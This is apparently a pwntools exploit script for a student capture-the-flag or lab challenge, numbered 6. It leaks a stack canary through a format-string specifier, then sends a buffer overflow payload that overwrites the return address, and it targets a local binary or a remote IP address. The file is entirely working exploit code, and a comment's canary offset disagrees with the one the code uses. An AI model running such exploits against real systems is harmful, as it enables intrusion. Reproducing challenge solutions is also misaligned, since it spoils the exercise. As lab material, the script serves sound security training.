from pwn import *

def conn():
    if args.GDB:
        return gdb.debug(args.BINARY, gdbscript="""
        continue
        b *vuln+110
        """)  # Add necessary gdb commands here
    elif args.REMOTE:
        return remote('52.184.85.16', 12345)
    else:
        return process("./6")

def solve():
    p = conn()
    context.arch = 'amd64'

    context.log_level = 'debug'
    p.sendlineafter(b"NIM:", b"13523111")
    p.sendlineafter(b"Challenge:", b"6")

    p.recvuntil(b"Oops: ")
    address = int(p.recvline()[:-1], 16)  # Address leak
    p.recvline()

    # Leak Canary
    p.sendline(b"%35$p")  # Offset canary pada %29$p
    leak = p.recvline().strip()
    canary = int(leak, 16)
    log.info(f"Leaked Canary: {hex(canary)}")

    # Build Payload
    buffer_size = 232  # Panjang buffer local_d8
    payload = b"A" * buffer_size
    payload += p64(canary)  # Tambahkan stack canary
    payload += b"B" * 8  # Padding untuk RBP
    payload += p64(address - 26)  # Return address untuk fungsi vuln (disesuaikan)

    with open("payload.bin", "wb") as f:
        f.write(b"%29$p\n")
        f.write(payload)

    # Send Payload
    p.sendline(payload)
    log.info("Payload sent. Switching to interactive mode.")
    p.interactive()  # Interaksi untuk melihat hasil

if __name__ == "__main__":
    solve()